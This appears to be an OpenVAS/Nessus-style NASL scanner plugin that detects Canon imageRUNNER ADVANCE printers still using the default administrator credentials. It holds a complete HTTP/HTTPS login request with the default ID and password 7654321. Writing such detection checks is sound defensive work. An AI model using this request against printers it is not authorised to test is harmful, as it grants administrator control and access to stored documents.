############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if(description)
{
 script_id(51799137);
 name = "Canon Canon-iR-ADV series printer - default password";
 script_name(name);
 script_category(ACT_ATTACK);
 script_family(english:"Camera");
 script_set_attribute(attribute:"risk_factor", value:"Medium");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_set_attribute(attribute:"description", value:"Canon Canon-iR-ADV series printer default password,the attacker can access the control panel with the default password, read the files stored in the printer, and perform administrator related operations directly in the control panel.");
 script_set_attribute(attribute:"solution", value:"Modify the password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits should be greater than 8.");
 script_end_attributes();
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("openvas-https.inc");


function check_vuln(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==80 ) host=host1;
    else host = string(host1,":",port);
	req = 'POST /login HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
	  'Connection: close\r\n' +
      'Content-Length: 85\r\n\r\n' +
	  'uri=%2F&user_type_generic=&loginType=admin&deptid=7654321&password=7654321&password2=';
     
	buf = http_keepalive_send_recv(port:port,data:req,bodyonly:FALSE);
	if( buf == NULL) exit(0);
	con = req + buf;
	if( "302 "><buf && "com.canon.meap.service.login.session="><buf ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}

function check_vuln_ssl(port){
	if ( !get_port_state(port) ) exit(0);
	host1 = get_host_name( );
	if( port==443 ) host=host1;
    else host = string(host1,":",port);

	req = 'POST /login HTTP/1.1\r\n' +
	  'Host: ' + host + '\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
	  'Connection: close\r\n' +
      'Content-Length: 85\r\n\r\n' +
	  'uri=%2F&user_type_generic=&loginType=admin&deptid=7654321&password=7654321&password2=';
    
	ssl_req = https_req_get(port:port,request:req);
	if( ssl_req == NULL) exit(0);
	con = req + ssl_req;
	if( "302 "><ssl_req && "com.canon.meap.service.login.session="><ssl_req ){
		if (report_verbosity > 0) security_hole(port:port, extra:con);
			  else security_hole(port);
	}
}


##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
